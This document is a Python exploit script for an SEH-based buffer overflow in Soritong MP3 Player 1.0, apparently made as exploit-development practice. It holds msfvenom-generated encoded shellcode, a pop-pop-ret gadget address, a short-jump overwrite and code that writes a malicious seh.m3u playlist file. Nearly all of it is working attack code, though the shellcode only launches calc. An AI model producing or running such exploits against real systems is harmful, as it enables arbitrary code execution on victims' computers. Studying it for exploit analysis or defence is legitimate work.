#!/usr/bin/env python

#
# Soritong MP3 Player 1.0 - SEH exploitation
# bad characters: \x00\x0a\x0d
# 0x5bc786b2 : pop eax # pop ebp # ret 0x0c | [strmdll.dll]
# msfvenom -p windows/exec CMD=calc.exe -e x86/shikata_ga_nai -b '\0x00\0x0a\0x0d' -i 1 -f c
# Tested On: Windows XP SP3 using Immunity dbg and mona.py plugin
#
#                  jump short x30
#                +---------------+
#                |               |
#                ^               |
#      +---------+ ------+       |
#      |         |       |       |
#      ^         |       v       v
# [AAA..AAA] [nextSEH] [SEH] [NOP..NOP] [SHELLCODE] [NOP..NOP]
#                ^       v
#                |       |
#                +-------+
#               pop pop ret
#                                   

shellcode=(
	"\xb8\x2e\x2d\xc4\xe5\xd9\xc7\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
	"\x31\x31\x43\x13\x03\x43\x13\x83\xeb\xd2\xcf\x31\x19\xc2\x92"
	"\xba\xe2\x12\xf3\x33\x07\x23\x33\x27\x43\x13\x83\x23\x01\x9f"
	"\x68\x61\xb2\x14\x1c\xae\xb5\x9d\xab\x88\xf8\x1e\x87\xe9\x9b"
	"\x9c\xda\x3d\x7c\x9d\x14\x30\x7d\xda\x49\xb9\x2f\xb3\x06\x6c"
	"\xc0\xb0\x53\xad\x6b\x8a\x72\xb5\x88\x5a\x74\x94\x1e\xd1\x2f"
	"\x36\xa0\x36\x44\x7f\xba\x5b\x61\xc9\x31\xaf\x1d\xc8\x93\xfe"
	"\xde\x67\xda\xcf\x2c\x79\x1a\xf7\xce\x0c\x52\x04\x72\x17\xa1"
	"\x77\xa8\x92\x32\xdf\x3b\x04\x9f\xde\xe8\xd3\x54\xec\x45\x97"
	"\x33\xf0\x58\x74\x48\x0c\xd0\x7b\x9f\x85\xa2\x5f\x3b\xce\x71"
	"\xc1\x1a\xaa\xd4\xfe\x7d\x15\x88\x5a\xf5\xbb\xdd\xd6\x54\xd1"
	"\x20\x64\xe3\x97\x23\x76\xec\x87\x4b\x47\x67\x48\x0b\x58\xa2"
	"\x2d\xe3\x12\xef\x07\x6c\xfb\x65\x1a\xf1\xfc\x53\x58\x0c\x7f"
	"\x56\x20\xeb\x9f\x13\x25\xb7\x27\xcf\x57\xa8\xcd\xef\xc4\xc9"
	"\xc7\x93\x8b\x59\x8b\x7d\x2e\xda\x2e\x82"
	)


payload="A"*260+"\xeb\x30\x90\x90"+"\xb2\x86\xc7\x5b"+"\x90"*50+shellcode+"\x90"*1000

flnm="seh.m3u"

textfile=open(flnm, 'w')
textfile.write(payload)
textfile.close
